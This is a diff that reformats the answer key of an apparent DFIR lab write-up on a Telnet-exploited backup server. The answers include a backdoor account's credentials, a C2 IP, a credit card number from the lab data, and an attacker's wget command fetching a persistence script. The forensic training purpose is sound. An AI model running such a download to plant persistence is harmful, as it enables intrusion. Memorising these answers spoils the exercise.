@@ -13,41 +13,49 @@ The objective of this exercise is to trace the full attack chain, identify key i
 You are a Junior DFIR Analyst at an MSSP that provides continuous monitoring and DFIR services to SMBs. Your supervisor has tasked you with analyzing network telemetry from a compromised backup server. A DLP solution flagged a possible data exfiltration attempt from this server. According to the IT team, this server wasn't very busy and was sometimes used to store backups.
 
 ## Task 1:
-Q: What CVE is associated with the vulnerability exploited in the Telnet protocol?
-
-A: `CVE-2026-24061`
+What CVE is associated with the vulnerability exploited in the Telnet protocol?
+```text
+CVE-2026-24061
+```
 
 ## Task 2:
-Q: When was the Telnet vulnerability successfully exploited, granting the attacker remote root access on the target machine?
-
-A: `2026-01-27 10:39:28`
+When was the Telnet vulnerability successfully exploited, granting the attacker remote root access on the target machine?
+```text
+2026-01-27 10:39:28
+```
 
 ## Task 3:
-Q: What is the hostname of the targeted server?
-
-A: `backup-secondary`
+What is the hostname of the targeted server?
+```text
+backup-secondary
+```
 
 ## Task 4:
-Q: The attacker created a backdoor account to maintain future access. What username and password were set for that account?
-
-A: `cleanupsvc:YouKnowWhoiam69`
+The attacker created a backdoor account to maintain future access. What username and password were set for that account?
+```text
+cleanupsvc:YouKnowWhoiam69
+```
 
 ## Task 5:
-Q: What was the full command the attacker used to download the persistence script?
-
-A: `wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh`
+What was the full command the attacker used to download the persistence script?
+```text
+wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh
+```
 
 ## Task 6:
-Q: The attacker installed remote access persistence using the persistence script. What is the C2 IP address?
-
-A: `91.99.25.54`
+The attacker installed remote access persistence using the persistence script. What is the C2 IP address?
+```text
+91.99.25.54
+```
 
 ## Task 7:
-Q: The attacker exfiltrated a sensitive database file. At what time was this file exfiltrated?
-
-A: `2026-01-27 10:49:54`
+The attacker exfiltrated a sensitive database file. At what time was this file exfiltrated?
+```text
+2026-01-27 10:49:54
+```
 
 ## Task 8:
-Q: Analyze the exfiltrated database. To follow compliance requirements, the breached organization needs to notify its customers. For data validation purposes, find the credit card number for a customer named Quinn Harris.
-
-A: `5312269047781209`
+Analyze the exfiltrated database. To follow compliance requirements, the breached organization needs to notify its customers. For data validation purposes, find the credit card number for a customer named Quinn Harris.
+```text
+5312269047781209
+```
